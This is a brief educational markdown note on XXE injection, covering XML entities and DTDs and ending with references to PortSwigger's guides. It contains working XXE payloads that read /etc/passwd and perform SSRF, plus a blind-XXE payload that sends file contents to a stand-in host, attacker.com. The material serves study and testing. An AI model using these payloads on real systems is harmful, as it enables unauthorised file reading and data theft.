# XML external entity (XXE) injection :syringe:

Uses XML data processing by a server to execute attacks against a server.  Can allow an attacker to:

- Read files on the server;
- Compromise the server; or
- Execute SSRF attacks.

Attacks occur when applications use XML to transmit data and do not disable potentially dangerous processing of XML entities.

:bulb: This type was more prevelant before JSON became the dominant data transfer format, but it is still sometimes exploitable.

## XML refresher

- `XML entities`: represent special characters in XML documents such as `&amp;`, `&gt;` and `&lt;`.
- `Document type definition (DTD)`: defines the structure of an XML document.  DTD is defined using a `DOCTYPE` tag.
- `XML custom entity`: define a custom entity in a DTD: `<!DOCTYPE foo [ <!ENTITY bar "bambaz" > ]>` which will cause `&bar;` to be replaced with the value `bambaz`.
- `XML external entity`: define an external entity in a DTD using the `SYSTEM` keyword.  They can be referenced from a local file or URL: 
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

Most XXE attacks are caused by XML external entities.

## XXE attacks

- `Retrieve file contents`: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>` will cause the contents of `/etc/passwd` to be returned.
- `Perform SSRF attack`: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://internal-website.com" > ]>` will cause the contents of `http://internal-website.com` to be returned.
- `Blind XXE to exfiltrate data`: 
```xml
# Cause the contents of `/etc/passwd` to be send to http://attacher.com
<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd" >
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>"> %eval; %exfiltrate; ]>`
```
- `Blind XXE to retrieve data via error messages`: attacker triggers an XML parsing error that leaks sensitive data.

:bulb: When testing for XXE vulnerabilities, you will often need to test each node of the XML document to see if it is vulnerable.

### Retrieve file contents
 

## Prevent

- Disable as much XML processing as possible.

## Tools

## References

- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind
- https://portswigger.net/web-security/xxe/xml-entities